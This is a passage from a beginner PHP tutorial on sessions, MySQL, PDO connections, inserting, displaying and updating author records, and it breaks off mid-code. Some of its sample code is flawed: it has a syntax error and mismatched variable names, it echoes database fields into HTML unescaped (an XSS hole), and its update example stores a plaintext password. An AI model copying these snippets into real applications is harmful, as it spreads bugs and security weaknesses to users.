If the session information exists, this means the user is logged in. The code then displays a personalized welcome message using the value stored in $\_SESSION\['username'\], which represents the logged-in user's identifier.

 

Next, the code displays the members-only content. In this example, it's simply a message indicating that this is members-only content, but in a real application, you could display various features or information specific to members.

 

Finally, the code displays a "Logout" link which redirects the user to a logout page (logout.php). This page manages the destruction of the session, allowing the user to log out.

 

![Image](images/image-141.png)

 

If the session information is not present, the user is not logged in. In this case, the code automatically redirects the user to the login page (login.php) using the header('Location: login.php') function. This ensures that only logged-in users can access members-only content.

###  

### Logging out and closing the session

The last step involves logging out the user and destroying the session. Here's how it's done in PHP :

Create a page named " logout.php " to manage the logout process.

*   On this page, start the session with session\_start() to access session information.

 

*   Then use the session\_unset() function to destroy the session variables associated with the user.

 

*   Then use the session\_destroy() function to completely destroy the current session, deleting all session data associated with the user.

 

After destroying the session, redirect the user to another page, such as the login or home page, using the header('Location: index.php') function.

This is what the code for the " logout.php" page would look like:

 

<?php  
   
 session\_start(); // We start the session

  
 session\_unset(); // We destroy our session variables  
   
 session\_destroy ); // Destroy our session  
  
 // Redirect the visitor to the home page  
 header('location: index.php');  
?> 

 

This code is effective for disconnecting users and redirecting them to the home page. However, it's important to note that the session\_unset() function is optional, as session\_destroy() already deletes all session data. Using session\_destroy() alone would be sufficient in most cases.

 

## Conclusion

In this chapter, we've explored cookie and session management in PHP in detail. We've learned how to use cookies to store information about the user's browser, enabling us to personalize the user experience and track visitor activity on the website. We also studied sessions, which offer a secure way of storing temporary server-side data for each active user, particularly useful for managing authentication and maintaining application state.

 

By understanding the mechanisms for creating, reading, modifying and deleting cookies, as well as creating and destroying sessions, PHP developers can implement advanced functionality in their web applications, such as user session management, content personalization, shopping cart management, and much more.

 

It is essential to note that cookie and session management must be carried out with care to guarantee the security and confidentiality of user data. By following good development practices and using the appropriate PHP functions, developers can create robust, secure Web applications that deliver a smooth, reliable user experience.

 

In short, understanding cookie and session management is fundamental for any PHP developer wishing to create interactive and dynamic Web applications. By mastering these concepts, developers can create websites that are both more efficient and more user-friendly.

# SECTION C

# MYSQL DATABASE MANAGEMENT

 

Data management is a fundamental pillar of modern web development. With this in mind, PHP and MySQL are essential tools for creating dynamic, interactive web applications. Section C of our book focuses on the efficient integration of databases into PHP projects, with particular emphasis on MySQL.

 

In this section, we'll explore in depth the key concepts involved in using databases with PHP. We'll start by understanding how to establish a secure connection to a MySQL database from a PHP script, focusing on good security practices to avoid potential vulnerabilities.

 

We'll then go on to learn how to query data from the database using SQL queries. We'll cover various data manipulation techniques, including inserting, selecting, updating and deleting data in a MySQL database using PHP scripts.

 

In this section, you'll gain an in-depth understanding of database integration in your PHP projects, strengthening your skills to develop robust, secure and high-performance web applications.

# Chapter 10

# Introduction to Databases and Connecting to a MySQL Database

 

 

Databases play an essential role in the development of dynamic, interactive web applications. They enable large quantities of data to be stored, organized and manipulated efficiently, providing a solid structure for our applications. In this chapter, we'll explore how databases work, focusing on connecting to a MySQL database from a PHP script. The chapter will be divided into three sections:

 

1\. Understanding databases

In this first part, we'll delve into the fundamental concepts of databases. We'll discover what a database is, its different types (relational, NoSQL, etc.), and key elements such as tables, columns, records and keys.

 

2\. Introduction to MySQL

MySQL is one of the most popular and widely used relational database management systems in the world of web development. In this section, we'll get to know MySQL, exploring its history, architecture and key features.

 

3\. MySQL database connection with PHP

Now that we have a basic understanding of databases and MySQL, we'll move on to the practical side by learning how to establish a connection between PHP and a MySQL database. We'll cover the steps needed to configure connection parameters, open and close a connection, as well as good security practices to protect our credentials.

 

In summary, this chapter will lay the foundations for our further exploration of database integration in our PHP applications, providing the knowledge and skills needed to establish a secure and efficient connection to a MySQL database.

 

 

## Understanding databases

Before delving into the technical details of database management with PHP, it's crucial to understand the fundamentals of how databases work.

 

### What is a database?

 

A database is an organized collection of data that is structured for easy access, efficient handling and consistent updating. It is designed to store information permanently, so that it can be retrieved and used at a later date.

 

### Database types

 

There are many different types of database, each with its own specific characteristics and uses. The two main types are relational databases and NoSQL databases.

 

*   Relational databases: These are based on the relational model and use tables to store data. Relationships between tables are established using primary and foreign keys, enabling structured data to be managed consistently.
*   NoSQL databases: These adopt a more flexible, less structured approach to data storage. They are often used for applications requiring scalability and flexibility in the management of unstructured or semi-structured data.

 

![Image](images/image-142.png)

 

 

 

### Key elements of a relational database

In a relational database, data is organized into different entities such as tables, columns and records. Here are the main elements of a relational database:

 

Tables: These represent linked data sets. Each table is made up of rows and columns.

Columns: These define the various attributes or data fields that make up a table.

Records: They represent the individual data stored in a table, each record corresponding to a row in the table.

 

Primary and foreign keys: These are used to establish relationships between tables. The primary key is a unique identifier for each record in a table, while the foreign key is used to reference a primary key in another table.

 

![Image](images/image-143.png)

 

### Data handling

Data manipulation in a database involves inserting, updating, retrieving and deleting data. These operations are performed using **SQL** (Structured Query Language) queries, a programming language specially designed to interact with relational databases.

 

In short, understanding databases is essential for any developer, as it provides the foundations needed to effectively design and manage complex information systems.

 

### Different database management systems (DBMS)

Database Management Systems (DBMS) are software programs designed to manage databases, ensuring their creation, manipulation, storage and access. There are several types of DBMS, each with its own characteristics and functionalities. The main types of DBMS are :

 

**Relational DBMS**: This type of DBMS is based on the relational model and uses the SQL language to manage data. Popular examples of relational DBMS are MySQL, PostgreSQL, Oracle Database and Microsoft SQL Server.

 

**NoSQL DBMS** : NoSQL DBMSs take a different approach to data management than relational DBMSs. They are designed to manage unstructured or semi-structured data, and offer high scalability. Examples of NoSQL DBMS include MongoDB, Cassandra and Redis.

 

**Object-oriented DBMS**: These DBMS are designed to store and manipulate objects rather than tabular data. They offer a more flexible approach to modeling complex data. Examples of object-oriented DBMS include db4o and ObjectDB.

 

**In-Memory DBMS**: These DBMS store data entirely in memory, enabling data to be accessed very quickly. They are used in applications requiring high performance. Examples of in-memory DBMS are Redis and Memcached.

 

Each type of DBMS has its advantages and disadvantages, and the choice of the appropriate DBMS depends on the specific needs of the application and technical constraints. For the purposes of this book, we'll be concentrating mainly on MySQL as a relational DBMS. MySQL is a widely used open-source DBMS, renowned for its reliability, performance and ease of use. Focusing on MySQL, we'll explore its use and features for efficient database management in the context of web development with PHP.

In this book, we've already installed XAMPP Server, which is a Web development package that includes Apache, MySQL, PHP and Perl. This means that MySQL is already included in the XAMPP installation.

In fact, by using XAMPP, you have not only MySQL, but also Apache and PHP installed on your system, enabling you to create and test Web applications locally.

 

## Introduction to MySQL

**Introducing MySQL** : MySQL is an open source relational database management system widely used in Web development. It was originally developed by MySQL AB in 1995 and is now maintained by Oracle Corporation following its acquisition in 2010. MySQL is renowned for its reliability, performance and ease of use, making it a popular choice among developers and enterprises worldwide.

 

**MySQL architecture** : MySQL uses a client-server architecture. The MySQL server is the central component that manages databases, while clients connect to the server to access and manipulate data. MySQL.

 

![Image](images/image-144.png)

 

In this architecture :

 

**Client**: Represents the client application that interacts with the MySQL server to send requests and receive results.

 

**MySQL server**: Handles client connections, interprets and executes SQL queries, manages security, data access and transactions.

 

**Database storage:** where data is physically stored on disk.

 

This client-server architecture is typical of relational database management systems such as MySQL. The client sends SQL queries to the MySQL server, which executes them, retrieves the results and returns them to the client.

 

**Advantages of MySQL** : MySQL's advantages include its stability, high performance, compatibility with many platforms and programming languages, flexibility for applications of different sizes, scalability to handle large amounts of data, as well as its active community and support ecosystem.

 

**MySQL limitations** : Although MySQL is a robust database management system, it does have certain limitations. For example, some advanced features such as transaction management and clustering functionality may not be as well developed as in other database management systems. In addition, free versions of MySQL may have restrictions on hardware resources and available functionality.

 

**MySQL usage**: MySQL is widely used in a variety of fields, including Web applications, content management systems (CMS) such as WordPress and Drupal, data analysis applications, mobile applications and many others. Its versatility and robustness make it a popular choice for a wide variety of projects and applications.

 

## MySQL database connection with PHP

Now that we have a basic understanding of databases and MySQL, we'll move on to the practical part: connecting to a MySQL database from a PHP script. In fact, to be able to query a database, it is necessary to first establish a connection with that database. In this part of the book, we'll learn the steps involved in establishing a secure connection, configuring connection parameters, opening and closing a connection, as well as good security practices to protect our credentials.

 

In short, this section will provide us with the knowledge and skills we need to understand and establish a secure connection to a MySQL database, laying the foundations for our further exploration of database integration in our PHP applications.

 

There are two main methods commonly used to manage connections to MySQL databases: using the **mysqli\_** extension and using the **PDO** (PHP Data Objects) object. Both offer robust functionality for establishing a secure connection and interacting with the MySQL database.

 

The first method, the mysqli\_ extension, provides a MySQL-specific interface with functions such as **mysqli\_connect** to establish the connection, **mysqli\_query** to execute SQL queries, and **mysqli\_fetch\_array** to retrieve results. This extension is directly integrated into PHP and offers high performance for interactions with MySQL.

 

The second method, the PDO extension, provides a more generic interface for working with different databases, including MySQL. PDO offers a more general database abstraction, making it easier to switch databases if necessary. It also supports prepared queries, offering greater security against SQL injections.

 

The choice between **mysqli\_** and **PDO** often depends on the developer's preferences and the specific needs of the project. Both methods are widely used and offer comprehensive functionality for interacting with MySQL in PHP. In this book, we focus on the use of the PDO object.

 

### What is PDO?

 

PDO (PHP Data Objects) is an extension introduced in PHP 5 that offers a data abstraction layer, meaning it is not specifically linked to MySQL and is independent of the database used. Thanks to PDO, code becomes portable very easily, making it possible to switch from a **MySQL** database to **SQLite**, **PostgreSQL**, **Oracle** and others simply by modifying the connection line.

 

PDO offers a number of advantages, including portability, ease of use and speed. Indeed, this extension offers a uniform interface for interacting with different databases, simplifying code development and maintenance.

 

### The PDO extension comprises three main classes:

 

**PDO** class: creates objects representing the database connection, and provides methods for essential operations such as sending queries, creating prepared queries and managing transactions.

 

**PDOStatement** class: represents a prepared query or SELECT query result. Its methods manage prepared queries and read query results.

 

**PDOException** class: allows you to manage and display error information using objects, making it easier to debug and manage errors in applications.

 

### Database connection process

 

The process of connecting to a MySQL database using PDO involves two main steps:

 

Creating an instance of the PDO class: First, create an instance of the PDO class by specifying the database connection parameters, such as host name, database name, user name and password.

 

Error handling: It is recommended to configure PDO to generate exceptions in the event of errors during connection or query execution. This allows errors to be handled appropriately in the code.

 

To illustrate this process concretely, let's take the example of creating a **library** web application. Before creating the corresponding database, let's create a directory named "**library**" on your Apache server, i.e. in the "htdocs" folder of XAMPP if you had installed it as explained in Chapter 1.

 

Creation of the "library" database

 

Next, we create a database named "library" and some associated tables:

 

At this stage, the database comprises three tables:

 

“**books**” table: book\_id, title, description, year\_published, author\_id, category\_id

“**authors**” table: author\_id, last name, first name, email, password, biography

“**categories**” table: category\_id, category\_name

 

Each table has a unique primary key: book\_id for the "books" table, author\_id for the "authors" table, and category\_id for the "categories" table.

 

In addition, in the "books" table, the columns "author\_id" and "category\_id" serve as foreign keys, meaning that they refer to the primary keys of the "authors" and "categories" tables respectively. This structure makes it possible to establish relationships between the various tables. For example, each book is associated with a specific author and a specific category, making it easy to organize and retrieve data according to these relationships.

 

![Image](images/image-145.png)

 

 

To create the database for this application, let's access phpMyAdmin via the following URL: http:[//localhost/phpmyadmin/](http://localhost/phpmyadmin/) after starting XAMPP. Next, let's create a new database, which we'll call "library".

 

![Image](images/image-146.png)

 

Next, you create the three tables "authors", "books" and "categories". The image below shows the creation of the "authors" table. Note that the "author\_id" attribute is the author identifier, of type "INT" (integer) and will be incremented automatically. To do this, check the box in the "AI" (Auto-incremented) column. The "last\_name", "first\_name", "email" and "password" attributes are of type VARCHAR (character string). The "biography" attribute is of type "text" to allow up to 65565 characters.

Following the same procedure, you then create the other two tables, "books" and "categories".

 

 

![Image](images/image-147.png)

 

Connection to the "library" database

 

In the "library" project directory, create a new file named "index.php". Inside this file, we insert the following code to test the connection to the "library" database.

 

<?php  
 // Database connection information   
 $host = 'localhost'; $dbname = 'library'; $username = 'root'; $password = '';  
  
 try {  
 // Create an instance of the PDO class to establish the connection  
 $connection = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);  
  
 // Set PDO to generate exceptions on errors   
 $connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
  
 echo "Database connection successfully established";  
 } catch (PDOException $e) {  
 // Connection error handling  
 echo "Connection error: " . $e\->getMessage();  
 }  
?>

 

In this example :

 

The variables $host, $dbname, $username and $password contain the informations needed to connect to the MySQL database.

Since the "library" application is developed locally, the value of $host is "localhost" and that of $username is "root". The $dbname variable represents the name of the database, which in this example is "library". The $password variable is empty, as no password has been defined for the "library" database.

We then instantiate a PDO object using this connection information, using the "new" keyword, which we'll explain in more detail in the section on object-oriented programming in PHP.

 

We use the syntax **mysql:host=$host;dbname=$dbname** to specify the database type (MySQL), host (server) and database name.

 

The method **setAttribute**(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION) is used to set PDO's error handling mode. Here's what each part of this instruction means:

 

**PDO::ATTR\_ERRMODE** is a constant that indicates the type of attribute we're configuring. In this case, we're configuring the error handling mode.

 

**PDO::ERRMODE\_EXCEPTION** is a constant that defines the error handling mode as exception-based. This means that if an error occurs during the execution of a SQL query, PDO will automatically throw a PDOException.

 

By using this error handling mode, errors related to the execution of SQL queries will be automatically converted into PDOException exceptions, making them easier to handle in the code using **try-catch** blocks. This makes error handling more explicit and efficient.

 

Finally, we display a message indicating that the connection to the database has been successfully established, or an error message in the event of a connection problem.

If you test this code by executing the index.php script, and if the connection is successful, you will obtain the following result:

 

![Image](images/image-148.png)

 

However, if an error occurs in the database connection information, you will receive a message similar to the following result:

 

![Image](images/image-149.png)

 

## Conclusion

This chapter has given us a detailed understanding of the process of connecting to a MySQL database using PHP. We've explored the PDO object method in detail. We've learned how to configure and handle connection errors effectively. We also explored the concepts of primary and foreign keys in database design, as well as practical steps for creating a database and tables in phpMyAdmin. Finally, we look at a concrete example of database connection and error handling. This chapter is a first step towards understanding MySQL database management in the context of web development with PHP. In subsequent chapters, we'll look at SQL queries for database management.

 

# Chapter 11

# Inserting, retrieving and displaying data from a database

 

 

In this chapter, we'll cover the various steps involved in inserting, retrieving and displaying data from a MySQL database using PHP and the PDO extension. We'll explore SQL queries for inserting new data, as well as PDO methods for executing these queries and displaying the results efficiently in our web applications.

 

We'll explore PDO methods for executing SQL insert queries and inserting new data into a database. This will include using SQL queries prepared with parameters and executing the query with execute().

 

We'll discuss various techniques for retrieving data inserted in a database and displaying it in our web applications. This will also include the use of loops to browse result records and display data in HTML tables, as well as other presentation formats.

 

This chapter will be covered by developing a mini library project and will provide you with a practical, in-depth understanding of how to insert, retrieve and display data from a MySQL database in their PHP web applications using the PDO extension, while focusing on security and good development practices.

 

## Data insertion with SQL

To illustrate the process of inserting data into a MySQL database, we're going to create an attractive insert form for the "authors" table in our "library" database. The first step is to create the Insert form in the index.php file, and we'll use CSS code to style the form. I'm assuming you know the basics of CSS, but if not, I suggest you consult my book "HTML & CSS: from Beginner to Expert".

 

### Insertion form (index.php) :

 

<!DOCTYPE html\>  
<html lang\="en">  
<head\>  
<meta charset\="UTF-8">  
<meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
<title\>Author Inscription</title\>  
<link rel\="stylesheet" href\="style.css">  
</head\>  
<body\>  
 <form action\="author\_registration.php" method\="POST">  
 <h2\>Author registration</h2\>  
 <input type\="text" name\="lastname" placeholder\="Last Name"><br\>  
 <input type\="text" name\="firstname" placeholder\="First Name"><br\>  
 <input type\="email" name\="email" placeholder\="Email"><br\>  
 <input type\="password" name\="password" placeholder\="Password"><br\>  
 <textarea name\="biography" placeholder\="biography"></textarea\><br\>  
 <input type\="submit" value\="Save">  
 </form\>  
</body\>  
</html\>

 

 

This HTML code creates an author inscription form with fields for last name, first name, email and password. When the form is submitted, the data is sent to the file "author\_registration.php" page via the POST method. The form is styled using an external style sheet "style.css" with the code line : 

 

<link rel="stylesheet" href="style.css">

###  

### CSS style sheet

 

Next, we create a new style.css file in which we put the following code to style the form:

 

 body {  
 font-family: Arial, sans-serif;  
 background-color: #f4f4f4;  
 margin: 0;  
 padding: 0;  
 display: flex;  
 justify-content: center;  
 align-items: center;  
 height: 100vh;  
 }  
  
 form {  
 background-color: #fff;  
 padding: 20px;  
 border-radius: 8px;  
 box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);  
 width: 400px;  
 margin: auto; /\* Ajout de cette ligne \*/  
 }  
  
 input {  
 width: calc(100% - 20px);  
 padding: 10px;  
 border: 1px solid #ccc;  
 border-radius: 4px;  
 margin-bottom: 15px;  
 }

 

 textarea {  
  width: calc(100% - 20px);  
  padding: 10px;  
  border: 1px solid #ccc;  
  border-radius: 4px;  
  margin-bottom: 15px;  
 }  
 input\[type\="submit"\] {  
 background-color: #007bff;  
 color: #fff;  
 border: none;  
 padding: 10px 20px;  
 cursor: pointer;  
 border-radius: 4px;  
 display: block;  
 margin: 0 auto;  
 }  
 input\[type\="submit"\]:hover {  
  background-color: #0056b3;  
 }

The form's "action" attribute indicates the path to a file called "author\_registration.php", responsible for retrieving the data submitted by the form and inserting it into the "authors" table of the "library" database. Let's create this file at the root of the "library" project.

Running index.php displays the following form:

 

![Image](images/image-150.png)

 

### Data processing and insertion

 

author\_registration.php

 

<?php  
 // Retrieve form data  
 $lastname = $\_POST\['lastname'\];  
 $firstname = $\_POST\['firstname'\];  
 $email = $\_POST\['email'\];  
 $password = $\_POST\['password'\];  
 $biography = $\_POST\['biography'\];  
  
 // Database connection  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
 $connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
  
 // Prepare insertion request  
 $request = $connection\->prepare("INSERT INTO authors (last\_name, first\_name, email, password, biography) VALUES (:lastname, :firstname, :email, :password, :biography)");  
  
 // Bind values to query parameters  
 $request\->bindParam(':lastname', $lastname);  
 $request\->bindParam(':firstname', $firstname);  
 $request\->bindParam(':email', $email);  
 $request\->bindParam(':password', $password);  
 $request\->bindParam(':biography', $biography);  
  
 // Execute query  
 $result = $request\->execute();  
  
 // Verify successful insertion  
 if ($result) {  
 echo "Author is registered successfully!";  
 } else {  
 echo "Error registered author.";  
 }  
?>

 

This PHP code begins by retrieving the data transmitted from the previous HTML form via the POST method. Next, a connection to the MySQL database is established using the PDO object with the credentials provided (host name, database name, username and password).

 

Next, an insertion SQL query is prepared with the **INSERT** **INTO** statement to addition a new row to the "authors" table. The values of the "lastname", "firstname", "email" and "password" fields are bound to the query parameters using the bindParam method. 

 

Once the values have been bound to the parameters, the query is executed with the execute() method, and the result of the execution is stored in the $result variable.

 

Finally, the code checks whether the insertion was successful by verifying the value of $result. If true, a message is displayed indicating that the author has been registered successfully. Otherwise, an error message is displayed, indicating that there was a problem registered the author.

 

Detailed explanation:

$query = $connection->prepare("INSERT INTO authors (last\_name, first\_name, email, password, biography) VALUES (:lastname, :firstname, :email, :password, :biography)");  
 

This line of code prepares an insert SQL query to be executed later in the database. Here's a detailed explanation:

 

**$connection->prepare()** : This is a method of the PDO object that prepares a SQL query for execution. It returns a PDOStatement object representing the prepared query.

 

"**INSERT INTO** authors (last\_name, first\_name, email, password, biography) VALUES (:lastname, :firstname, :email, :password, :biography)" : This is the prepared insertion SQL query. It tells the database to insert a new row in the "authors" table with the values supplied for the "last\_name", "first\_name", "email", "password" and "biography" columns. The column values are represented by named parameter tags (":lastname", ":firstname", ":email", ":password", ":biography"), which will be linked to the values supplied when the query is run.

 

The query structure is as follows:

 

*   INSERT INTO authors: Indicates an insertion request in the "authors" table.
*   (last\_name, first\_name, email, password, biography): Specifies the column names to which values will be added.
*   VALUES (:lastname, :firstname, :email, :password, :biography): Indicates the values to be inserted in the corresponding columns. Parameter markers named ":lastname", ":firstname", ":email", ":password" and ":biography". ":password" and ":biography" are used to represent these values.

 

By using named parameter markers, the prepared query is secured against SQL injection attacks and allows SQL logic to be separated from the logic of the data value to be inserted.

 

In short, this line of code prepares an insert query in the "authors" table with named parameters for the values to be inserted in the specified columns.

 

*   The five lines of code with the bindParam() method, bind the values of the parameter markers named in the prepared query to the specified PHP variables. Here's a detailed explanation:

 

$query->bindParam(':lasstname', $lastname); : This line binds the value of the PHP variable $lastname to the parameter tag named ":lastname" in the prepared query. This means that the value of the variable $lastname will be used to replace the parameter marker named ":lastname" when the query is executed.

 

$requete->bindParam(':firstname', $firstname); : In a similar way, this line binds the value of the PHP variable $firstname to the parameter tag named ":firstname" in the prepared query.

 

$request->bindParam(':email', $email); : This line binds the value of the PHP variable $email to the parameter tag named ":email" in the prepared request.

 

$request->bindParam(':password', $password); : In a similar way, this line binds the value of the PHP variable $password to the parameter tag named ":password" in the prepared request.

 

$requete->bindParam(':biography, $biography); : In a similar way, this line binds the value of the PHP variable $biography to the parameter tag named ": biography " in the prepared query.

 

 

By linking PHP variable values to named parameter tags, these lines prepare the query to be executed with the specified values for each column of the "authors" table. This allows user-supplied data to be inserted into the database in a secure and controlled manner.

 

The line of code: $result \= $request->execute(); executes the prepared query that was previously prepared using the PDO object's prepare() method. Here's a detailed explanation:

 

**$result = $requete->execute();** : This instruction calls the execute() method on the PDOStatement object $request, which represents the prepared query. This method executes the prepared SQL query with the values bound to the parameter markers, as previously defined using bindParam(). It returns true if the query has been executed successfully, and false otherwise. The return value is assigned to the $result variable. This variable can then be used to check whether the query succeeded or failed.

 

At this point, after submitting and validating the form on your index.php page without generating any errors, you'll receive a message stating "Author is registered successfully!". If you then access the URL http://localhost/phpmyadmin/ and consult the "authors" table in your "library" database, you should see a record for the author "Dupont Alice" with an identifier equal to 1.

 

![Image](images/image-151.png)

 

However, it is important to note that the password has been stored unencrypted in the database, representing a potential security risk. If a malicious person gains access to your database, they will have access to this sensitive information. This could compromise the security of your application's users, as passwords should always be stored securely, for example using hashing techniques to make them unreadable even in the event of unauthorized access to the database. To solve this problem, one of the most common solutions is to hash the password before inserting it into the database.

Let's modify the file author\_registration.php, additioning the following line of code before the database connection code:

 

 

 // Password hash  
 $password\_hash \= password\_hash($password, PASSWORD\_DEFAULT);

 

 

This line of code is an instruction that uses the **password\_hash()** function to hash the password retrieved from the form. This function takes two parameters: the password to hash and the hash algorithm to use.

 

$password: This is the variable containing the raw password retrieved from the form.

 

$password\_hash: This is the variable that will contain the result of the password hash. This result is a secure and unique character string generated by the hash algorithm.

 

PASSWORD\_DEFAULT: This is a constant provided by PHP that represents the recommended default hash algorithm for the password\_hash() function. This constant can be updated according to PHP versions to use the most secure hash algorithms available.

 

Next, we replace the line: $request->bindParam(':password', $password); with the following code

 

 

// Use hashed password

$request->bindParam(':password', $password\_hash);

 

 

If you fill out the form on the index.php page to register a new author and everything goes smoothly, you will see the message "Author added successfully!". Upon checking the authors table in your database, you should observe the registered data as shown in the example below:

 

![Image](images/image-152.png)

 

 

Note in particular the password column for the author with ID = 2. This value is a long string, indicating that the password has been hashed before being stored in the database, thus enhancing data security. You can continue to register other authors.

## Selecting and displaying database data

In this section, we'll look at how to select and display data from a database using PHP and MySQL. We'll start by writing the code to select all the authors in the "authors" table in our database, then we'll see how to display this data in an HTML table.

Let's now create a new file named " display\_authors.php" in the "library" project directory. Here is the code to select the authors:

 

 

<?php  
  
 // Database connection  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
$connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
  
// Prepare author selection query  
$query = $connection\->prepare("SELECT \* FROM authors");  
  
// Execute query  
$query\->execute();  
  
// Retrieve results as associative array  
$authors = $query\->fetchAll(PDO::FETCH\_ASSOC);  
  
?>

 

 

The line: $query \= $connection->prepare("SELECT \* FROM authors"); prepares an SQL query to select all columns (\*) in the "authors" table.

 

The line: $authors \= $query->fetchAll(PDO::FETCH\_ASSOC); retrieves all query results as an associative array and stores them in the $authors variable.

 

In summary, in this first step, after connecting to the database, the code executes an SQL query to select all authors, retrieves the results and stores them in an associative array $authors.

Now we can move on to displaying these authors in an HTML table.

 

Let's modify the file display\_authors.php, as follows:

 

 

 

 

<!DOCTYPE html\> <html lang\="en">  
<head\> <meta charset\="UTF-8">  
<meta name\="viewport" content\="width=device-width, initial-scale=1.0">  
<title\>List of Authors</title\>  
</head\>  
  
<body\>  
 <h2\>List of Authors</h2\>  
 <?php  
 // Part1 - select and retrieve all authors   
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
$connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
$query = $connection\->prepare("SELECT \* FROM authors");  
  
 $query\->execute();  
  
 $authors = $query\->fetchAll(PDO::FETCH\_ASSOC);  
  
 // Part 2 - Displaying results in an HTML table  
 if (count($authors) > 0) {  
 echo "<table>";  
 echo "<tr>  
 <th>ID</th>  
 <th>Last Name</th>  
 <th>First Name</th>  
 <th>Email</th>  
 <th>Biography</th>  
  </tr>";  
 foreach ($authors as $author) {  
 echo "<tr>";  
 echo "<td>{$author\['author\_id'\]}</td>";  
 echo "<td>{$author\['last\_name'\]}</td>";  
 echo "<td>{$author\['first\_name'\]}</td>";  
 echo "<td>{$author\['email'\]}</td>";  
 echo "<td>{$author\['biography'\]}</td>";  
 echo "</tr>";  
 }  
 echo "</table>";  
 } else {  
 echo "No author found.";  
 }  
 ?>  
</body\>  
</html\>

 

 

Part 2 of this code first checks if there are authors in the database by checking if the number of authors retrieved from the $authors variable is greater than zero with the **if (count($authors) > 0)** condition. If authors are found, the code generates an HTML table to display the details of each author. Otherwise, if no authors are found, it displays the message "No authors found."

 

Within the **foreach** loop, each author in the $authors array is browsed. For each author, the code generates a new table row with author details such as author ID ($author\['author\_id\]), last name ($author\['last\_name'\]), first name ($author\['first\_name'\]), email ($author\['email'\]), and biography ($author\[biography\]). These details are displayed in table cells (<td>) and each author is displayed in a new table row (<tr>).

 

Running display\_authors.php produces a result similar to the following:

 

![Image](images/image-153.png)

 

To enhance the appearance of this table, consider applying CSS styling. Begin by creating a style\_tab.css file, mirroring the steps taken in the previous chapter. Next, reference this file within the header (head) of your display\_authors.php file by adding the following line of code.

 

 

 <head> <meta charset="UTF-8">  
 <meta name="viewport" content="width=device-width, initial-scale=1.0">  
 <title>List of Authors</title>  
 <link rel="stylesheet" href="style\_tab.css">  
 </head>

 

 

Next, you can addition the following CSS style to customize the table's appearance.

 

 

 table {  
 width: 100%;  
 border-collapse: collapse;  
 } 

  
 th, td {  
 border: 1px solid #ddd;  
 padding: 8px;  
 text-align: left;  
 }  
  
  
 th {  
 background-color: #f2f2f2;  
 }

 

 

In this code we have :

 

*   **Table**: This rule defines the basic styles for all tables in the document.

width: 100%; indicates that the width of the table should adapt to the width of its container.

border-collapse: collapse; specifies that the borders of the table cells should be collapsed to form a single border.

 

*   **th, td**: This rule defines the styles for header cells (th) and data cells (td) in the table.

border: 1px solid #ddd; creates a 1 pixel solid light gray border around each cell.

padding: 8px; adds an inner padding of 8 pixels to each cell to improve readability.

text-align: left; aligns the text content to the left in each cell.

 

*   **th**: This rule defines specific styles for header cells (th) in the table.

background-color: #f2f2f2; sets a light gray background color for header cells to visually distinguish them from data cells.

 

Now, if you run the file dispaly\_authors.php, you will get a result similar to the following one:

 

![Image](images/image-154.png)

 

## Conclusion

In this chapter, we explored the process of inserting, retrieving and displaying data from a database using PHP and MySQL. We learned how to establish a secure connection to the database, insert data into tables, retrieve this data using SQL queries, and finally display this data in a structured way in our web application.

 

By using PDO's features, we were able to manage operations securely and efficiently, preventing potential attacks such as SQL injection. In addition, we also explored techniques to improve security by hashing passwords before storing them in the database.

 

Finally, by applying CSS styles, we were able to present the retrieved data in well-formatted tables, offering an optimal user experience.

 

This chapter provides a solid foundation for understanding the fundamentals of data manipulation in a web application, paving the way for more advanced features such as data update and deletion, which we'll cover in the next chapter.

 

# Chapter 12

# Updating and deleting data in a database

#  

Updating and deleting data in a database are crucial operations for maintaining the integrity and relevance of the information stored. In this chapter, we'll explore in detail how to perform these operations using PHP and MySQL.

We'll cover techniques for updating existing records in a table, as well as methods for safely deleting data. We'll also look at good security practices to avoid errors and protect sensitive data during these critical operations.

By combining the knowledge acquired in this chapter with that of the previous chapters on data insertion, retrieval and display, you'll be able to create robust, functional applications that fully exploit the potential of relational databases.

 

## Updating data in a database

In this section, we'll look at updating data in a database. Updating is the process of modifying existing values in a table. Whether to correct errors, update information or monitor data evolution, the ability to perform updates is essential in the development of web applications.

We'll explore the various steps involved in updating data in a MySQL database using PHP. This includes preparing update requests, executing these requests and checking the success of the operation.

To illustrate update operations, we are continuing to develop our "library" mini-project. We'll be giving you detailed instructions on how to update your own projects securely and efficiently.

 

### Update process

 

In general, to update the data in a table, you need to follow these steps:

 

Identification of the record to be updated :

 

You must first identify the table record you wish to update. This can be done by retrieving the identifier of that record, such as the author ID in our example.

 

Retrieving new data :

Get the new data you want to update for this record.

 

Database connection :

Establish a database connection using PDO to run SQL queries.

 

Preparing and executing the update request :

Prepare the update SQL query using PDO's prepare() method.

Execute the request using the execute() method.

 

Linking values :

 

Link replacement values to query parameters using the bindParam() method.

 

Checking the success of the update :

Check the result of the query execution to confirm that the update was successful.

 

Display a confirmation message :

 

Display an appropriate message to inform the user of the result of the update operation.

Here's an example of PHP code you can place in a new file called "edit\_author.php".

 

<?php  
 $author\_id = 1; // Example of author ID to be updated  
  
 // New author information  
 $new\_lastname = "New Last Name";  
 $new\_firstname = "New First Name";  
 $new\_email = "newaddress@example.com";  
 $new\_password = "new\_password";  
 $new\_biography = "New biography";  
  
 // Database connection  
$connection = new PDO("mysql:host=localhost;dbname=library", "root","");  
$connection\->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION);  
  
 // Update request  
 $request = $connection\->prepare("UPDATE authors SET  
 last\_name = :new\_lastname,  
 first\_name = :new\_firstname,  
 email = :new\_email,  
 password = :new\_password,  
 biography = :new\_biography  
 WHERE author\_id = :author\_id");  
  
 // Bind parameters  
 $request\->bindParam(':new\_lastname', $new\_lastname);  
 $request\->bindParam(':new\_firstname', $new\_firstname);  
 $request\->bindParam(':new\_email', $new\_email);  
